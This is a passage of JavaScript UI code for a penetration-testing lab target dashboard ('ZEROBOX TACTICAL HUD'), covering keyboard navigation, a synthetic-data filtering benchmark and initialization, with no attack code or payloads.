        const kbdModal = document.getElementById('keyboardModal');
        if (kbdModal) kbdModal.classList.toggle('open');
        return;
      }

      // 6. Navigation: J / K
      if (!isInput) {
        const cards = document.querySelectorAll('.target-card');
        if (cards.length > 0) {
          if (e.key === 'j' || e.key === 'J') {
            e.preventDefault();
            setFocusedCard(STATE.focusedCardIndex + 1);
            return;
          }
          if (e.key === 'k' || e.key === 'K') {
            e.preventDefault();
            setFocusedCard(STATE.focusedCardIndex - 1);
            return;
          }
          // Space / Enter: Open inspector for focused card
          if ((e.key === ' ' || e.key === 'Enter') && STATE.focusedCardIndex >= 0) {
            e.preventDefault();
            const currentCard = cards[STATE.focusedCardIndex];
            if (currentCard) {
              const targetId = currentCard.getAttribute('data-target-id');
              openInspector(targetId);
            }
            return;
          }
        }
      }
    });
  }

  // --------------------------------------------------------------------------
  // 13. PERFORMANCE BENCHMARK ENGINE (SUB-2MS VALIDATION)
  // --------------------------------------------------------------------------
  window.runZeroboxBenchmark = function (count = 1000) {
    const synthetic = [];
    const oses = ['Linux', 'Windows'];
    const platforms = ['HTB', 'THM', 'Custom'];
    const difficulties = ['Easy', 'Medium', 'Hard', 'Insane'];
    const archetypes = ['Active Directory Domain Controller', 'Hardened Linux Bastion', 'Memory Corruption & Exploit Dev', 'Multi-Tier Cloud & Pod Cluster'];

    for (let i = 0; i < count; i++) {
      synthetic.push({
        id: `synth-${i}`,
        name: `TARGET_${i}`,
        ip: `10.10.${Math.floor(i / 254)}.${i % 254}`,
        os: oses[i % oses.length],
        platform: platforms[i % platforms.length],
        difficulty: difficulties[i % difficulties.length],
        status: i % 3 === 0 ? 'completed' : 'active',
        archetype: archetypes[i % archetypes.length],
        archetypeCategory: 'ad',
        attackVectors: ['Kerberos', 'SSRF', 'Privesc'],
        certs: ['OSCP', 'CPTS'],
        description: `Synthetic target ${i} for memory benchmark`
      });
    }

    const t0 = performance.now();
    const query = 'target_5';
    const result = synthetic.filter(t => t.name.toLowerCase().includes(query) && t.os === 'Windows');
    const t1 = performance.now();
    const elapsed = t1 - t0;

    console.log(`[ZEROBOX BENCHMARK] Filtered ${count} targets in ${elapsed.toFixed(3)}ms (Found: ${result.length}). Target: < 2.0ms. Status: ${elapsed < 2.0 ? 'PASSED' : 'SLOW'}`);
    return { count, elapsedMs: elapsed, passed: elapsed < 2.0 };
  };

  // --------------------------------------------------------------------------
  // 14. INITIALIZATION
  // --------------------------------------------------------------------------
  function init() {
    applyThemeAndMode(STATE.theme, STATE.mode);
    renderTargetCards();
    setupEventListeners();
    setupKeyboardShortcuts();
    restoreActiveTargetSession();
    console.log('[ZEROBOX TACTICAL HUD] Controller initialized successfully. Press [?] for hotkeys.');
  }

  window.initZerobox = init;

  if (document.getElementById('targetGrid')) {
    init();
  } else if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }

})();
